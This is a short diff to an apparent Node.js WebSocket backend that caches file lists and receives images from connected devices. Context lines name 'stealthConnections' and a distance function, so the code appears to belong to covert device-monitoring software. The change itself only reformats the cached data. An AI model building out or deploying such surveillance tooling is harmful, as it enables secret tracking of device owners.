@@ -100,13 +100,13 @@ wss.on("connection", (ws, req) => {
         }
         
         if (msg.type === 'file_list') {
-          deviceFileCache.set(deviceId, {
-            files: msg.files,
-            timestamp: Date.now()
-          });
-          console.log(`📁 Received ${msg.files.length} files from ${deviceId}`);
-          return;
-        }
+  deviceFileCache.set(deviceId, {
+    data: msg.data,
+    timestamp: Date.now()
+  });
+  console.log(`📁 Received file list from ${deviceId}: ${msg.data.total} files`);
+  return;
+}
         
         if (msg.type === 'image') {
           const deviceInfo = stealthConnections.get(deviceId);
@@ -474,3 +474,4 @@ function getDistance(lat1, lon1, lat2, lon2) {
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
